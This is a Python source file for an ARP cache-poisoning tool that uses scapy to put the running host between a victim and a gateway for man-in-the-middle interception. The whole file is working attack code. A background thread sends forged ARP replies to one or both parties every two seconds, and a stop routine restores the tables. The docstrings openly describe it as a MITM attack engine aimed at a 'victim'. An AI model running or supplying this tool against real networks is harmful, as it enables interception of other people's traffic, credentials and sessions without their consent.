"""
ARP Spoofer
===========
Man-in-the-middle attack via ARP cache poisoning.

Supports both half-duplex (target -> gateway) and full-duplex
(target <-> gateway) spoofing modes with packet forwarding.
"""

import time
import threading
from typing import Optional, Dict, Any


class ARPSpoofer:
    """ARP cache poisoning engine for MITM attacks."""

    def __init__(self, iface: str):
        self.iface = iface
        self.target_ip: Optional[str] = None
        self.target_mac: Optional[str] = None
        self.gateway_ip: Optional[str] = None
        self.gateway_mac: Optional[str] = None
        self._running = False
        self._thread: Optional[threading.Thread] = None
        self.stats: Dict[str, Any] = {
            "packets_sent": 0,
            "start_time": None,
        }

    def resolve_targets(self, target_ip: str, gateway_ip: str) -> bool:
        """Resolve MAC addresses for target and gateway."""
        try:
            from scapy.all import getmacbyip
            self.target_ip = target_ip
            self.gateway_ip = gateway_ip
            self.target_mac = getmacbyip(target_ip)
            self.gateway_mac = getmacbyip(gateway_ip)
            return self.target_mac is not None and self.gateway_mac is not None
        except Exception:
            return False

    def start(self, target_ip: str, gateway_ip: str, full_duplex: bool = True) -> bool:
        """
        Start ARP spoofing attack.

        Args:
            target_ip: Victim IP address
            gateway_ip: Gateway/router IP address
            full_duplex: Poison both target and gateway ARP tables

        Returns:
            True if attack started successfully
        """
        if not self.resolve_targets(target_ip, gateway_ip):
            return False

        self._running = True
        self.stats["start_time"] = time.time()
        self._thread = threading.Thread(
            target=self._spoof_loop,
            args=(full_duplex,),
            daemon=True,
        )
        self._thread.start()
        return True

    def _spoof_loop(self, full_duplex: bool) -> None:
        """Main spoofing loop sending ARP replies."""
        try:
            from scapy.all import ARP, send
            while self._running:
                # Poison target: tell target that gateway is at our MAC
                send(
                    ARP(op=2, pdst=self.target_ip, psrc=self.gateway_ip,
                        hwdst=self.target_mac),
                    iface=self.iface,
                    verbose=0,
                )
                self.stats["packets_sent"] += 1

                if full_duplex:
                    # Poison gateway: tell gateway that target is at our MAC
                    send(
                        ARP(op=2, pdst=self.gateway_ip, psrc=self.target_ip,
                            hwdst=self.gateway_mac),
                        iface=self.iface,
                        verbose=0,
                    )
                    self.stats["packets_sent"] += 1

                time.sleep(2)
        except Exception as e:
            print(f"[ARP] Spoof loop error: {e}")

    def stop(self) -> None:
        """Stop ARP spoofing and restore ARP tables."""
        self._running = False
        if self._thread:
            self._thread.join(timeout=3)
        self._restore_arp()

    def _restore_arp(self) -> None:
        """Send legitimate ARP replies to restore tables."""
        try:
            from scapy.all import ARP, send
            if self.target_mac and self.gateway_mac:
                for _ in range(5):
                    send(ARP(op=2, pdst=self.target_ip, psrc=self.gateway_ip,
                             hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.gateway_mac),
                         iface=self.iface, verbose=0)
                    send(ARP(op=2, pdst=self.gateway_ip, psrc=self.target_ip,
                             hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.target_mac),
                         iface=self.iface, verbose=0)
                    time.sleep(1)
        except Exception:
            pass

    def get_stats(self) -> Dict[str, Any]:
        """Return current attack statistics."""
        runtime = 0.0
        if self.stats["start_time"]:
            runtime = time.time() - self.stats["start_time"]
        return {
            **self.stats,
            "runtime": round(runtime, 1),
            "running": self._running,
            "target": self.target_ip,
            "gateway": self.gateway_ip,
        }
